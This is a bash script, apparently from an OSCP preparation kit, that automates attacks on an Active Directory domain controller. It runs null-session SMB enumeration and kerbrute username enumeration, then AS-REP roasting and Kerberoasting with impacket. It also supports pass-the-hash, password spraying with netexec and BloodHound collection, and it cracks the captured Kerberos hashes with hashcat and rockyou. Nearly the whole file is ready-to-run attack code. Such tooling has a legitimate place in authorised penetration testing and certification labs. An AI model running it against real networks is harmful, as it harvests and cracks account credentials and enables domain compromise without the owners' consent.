#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# ad-fastpath.sh — OSCP Active Directory fast-path enumeration & roasting.
# Runs null-session enum, AS-REP roast, Kerberoast, optional spray + BloodHound,
# and auto-launches hashcat on anything roastable. Outputs to the box workspace.
#
# Usage:
#   ad-fastpath.sh -d <domain> -i <DC-IP> [-u user] [-p pass | -H nthash]
#                  [-U userlist] [-n name] [-s] [-b] [-c]
#   -d  domain FQDN (e.g. corp.local)        -i  DC IP
#   -u  username            -p  password     -H  NT hash (pass-the-hash)
#   -U  userlist file (for enum/spray; defaults to SecLists xato-net-10M-usernames)
#   -n  workspace name under targets/ (default: <domain>)
#   -s  password-spray -U list with -p as the password (needs -p, -U)
#   -b  collect BloodHound (bloodhound-python; needs creds)
#   -c  auto-crack roasted hashes with hashcat + rockyou
#
# Examples:
#   ./ad-fastpath.sh -d corp.local -i 10.10.10.5                      # unauth: userenum + AS-REP
#   ./ad-fastpath.sh -d corp.local -i 10.10.10.5 -u bob -p Pass1 -c   # roast + crack
#   ./ad-fastpath.sh -d corp.local -i 10.10.10.5 -u bob -p Pass1 -b   # + BloodHound

set -o pipefail
DOMAIN=""; DCIP=""; USER=""; PASS=""; HASH=""; ULIST=""; NAME=""
SPRAY=0; BH=0; CRACK=0
ROCKYOU=/usr/share/wordlists/rockyou.txt
DEFAULT_ULIST=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

while getopts "d:i:u:p:H:U:n:sbch" o; do case "$o" in
  d) DOMAIN=$OPTARG;; i) DCIP=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;;
  H) HASH=$OPTARG;; U) ULIST=$OPTARG;; n) NAME=$OPTARG;;
  s) SPRAY=1;; b) BH=1;; c) CRACK=1;;
  h|*) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
esac; done

[ -z "$DOMAIN" ] || [ -z "$DCIP" ] && { echo "[!] -d <domain> and -i <DC-IP> are required. -h for help."; exit 1; }
[ -z "$NAME" ] && NAME=$DOMAIN
[ -z "$ULIST" ] && ULIST=$DEFAULT_ULIST
OUT="${WORKDIR:-$KIT/targets}/$NAME/ad"
mkdir -p "$OUT"
DC="$DOMAIN"   # kerbrute/impacket use the FQDN; DC-IP passed via -dc-ip

# auth args for impacket ( user:pass  or  user with -hashes for PtH )
AUTH_OK=0
if [ -n "$USER" ] && { [ -n "$PASS" ] || [ -n "$HASH" ]; }; then AUTH_OK=1; fi
log(){ echo -e "\n\033[1;34m[*] $1\033[0m"; }
save(){ echo "    -> $1"; }

echo "=================================================="
echo " AD FAST-PATH   domain=$DOMAIN  dc=$DCIP  user=${USER:-<none>}"
echo " output -> $OUT"
echo "=================================================="

# --- host / SMB sanity + null session ---
log "SMB / host info (netexec)"
netexec smb "$DCIP" 2>&1 | tee "$OUT/nxc_smb.txt"
netexec smb "$DCIP" -u '' -p '' --shares 2>&1 | tee "$OUT/nxc_nullsession.txt"

# --- user enumeration (kerbrute, no creds needed) ---
if [ -f "$ULIST" ]; then
  log "Kerbrute userenum ($(basename "$ULIST"))"
  kerbrute userenum -d "$DOMAIN" --dc "$DCIP" "$ULIST" 2>&1 | tee "$OUT/kerbrute_userenum.txt"
  grep -oP 'VALID USERNAME:\s+\K[^@ ]+' "$OUT/kerbrute_userenum.txt" 2>/dev/null | sort -u > "$OUT/valid_users.txt"
  [ -s "$OUT/valid_users.txt" ] && save "$OUT/valid_users.txt ($(wc -l < "$OUT/valid_users.txt") users)"
else
  echo "[!] Userlist $ULIST not found — skipping kerbrute enum."
fi

# --- AS-REP roast (no creds; needs a userlist) ---
ASREP_LIST="$OUT/valid_users.txt"; [ -s "$ASREP_LIST" ] || ASREP_LIST="$ULIST"
if [ -f "$ASREP_LIST" ]; then
  log "AS-REP roasting (GetNPUsers, no-preauth)"
  impacket-GetNPUsers "$DOMAIN"/ -dc-ip "$DCIP" -usersfile "$ASREP_LIST" -no-pass -format hashcat \
    2>&1 | tee "$OUT/asrep_raw.txt"
  grep '\$krb5asrep\$' "$OUT/asrep_raw.txt" > "$OUT/asrep_hashes.txt" 2>/dev/null
  [ -s "$OUT/asrep_hashes.txt" ] && save "$OUT/asrep_hashes.txt (hashcat -m 18200)"
fi

# --- authenticated actions ---
if [ "$AUTH_OK" = 1 ]; then
  if [ -n "$HASH" ]; then IMPAUTH=(-hashes ":$HASH"); CREDSTR="$DOMAIN/$USER (PtH)"; else IMPAUTH=(); CREDSTR="$DOMAIN/$USER:$PASS"; fi
  PRINCIPAL="$DOMAIN/$USER"; [ -n "$PASS" ] && PRINCIPAL="$DOMAIN/$USER:$PASS"

  log "Kerberoasting (GetUserSPNs, -request)"
  impacket-GetUserSPNs "$PRINCIPAL" -dc-ip "$DCIP" "${IMPAUTH[@]}" -request -outputfile "$OUT/kerberoast_hashes.txt" \
    2>&1 | tee "$OUT/kerberoast_raw.txt"
  [ -s "$OUT/kerberoast_hashes.txt" ] && save "$OUT/kerberoast_hashes.txt (hashcat -m 13100)"

  log "Domain user / group quick pull (netexec)"
  if [ -n "$HASH" ]; then NXA=(-u "$USER" -H "$HASH"); else NXA=(-u "$USER" -p "$PASS"); fi
  netexec smb "$DCIP" "${NXA[@]}" --users 2>&1 | tee "$OUT/nxc_users.txt"
  netexec smb "$DCIP" "${NXA[@]}" --groups 2>&1 | tee "$OUT/nxc_groups.txt"
  netexec smb "$DCIP" "${NXA[@]}" --pass-pol 2>&1 | tee "$OUT/nxc_passpol.txt"

  if [ "$BH" = 1 ]; then
    log "BloodHound collection (bloodhound-python)"
    ( cd "$OUT" && bloodhound-python -d "$DOMAIN" -u "$USER" ${PASS:+-p "$PASS"} ${HASH:+--hashes ":$HASH"} \
        -ns "$DCIP" -c All --zip 2>&1 | tee "$OUT/bloodhound.txt" )
    ls "$OUT"/*.zip 2>/dev/null && save "BloodHound zip in $OUT (import into BloodHound GUI)"
  fi
else
  echo -e "\n[i] No creds supplied — skipped Kerberoast/user-pull/BloodHound (need -u with -p or -H)."
fi

# --- password spray ---
if [ "$SPRAY" = 1 ]; then
  if [ -n "$PASS" ] && [ -f "$ULIST" ]; then
    log "Password spray ('$PASS' across $(basename "$ULIST"))"
    netexec smb "$DCIP" -u "$ULIST" -p "$PASS" --continue-on-success 2>&1 | tee "$OUT/spray.txt"
    grep '\[+\]' "$OUT/spray.txt" | tee "$OUT/spray_hits.txt"
  else echo "[!] -s spray needs -p <password> and a -U userlist."; fi
fi

# --- auto-crack ---
if [ "$CRACK" = 1 ]; then
  for pair in "18200:$OUT/asrep_hashes.txt" "13100:$OUT/kerberoast_hashes.txt"; do
    m=${pair%%:*}; f=${pair#*:}
    if [ -s "$f" ]; then
      log "hashcat -m $m on $(basename "$f")"
      hashcat -m "$m" "$f" "$ROCKYOU" --quiet -o "$OUT/cracked_${m}.txt" 2>&1 | tail -5
      [ -s "$OUT/cracked_${m}.txt" ] && { echo "  [+] CRACKED:"; cat "$OUT/cracked_${m}.txt"; }
    fi
  done
fi

echo -e "\n\033[1;32m[+] AD fast-path complete. Results in $OUT\033[0m"
ls -la "$OUT"
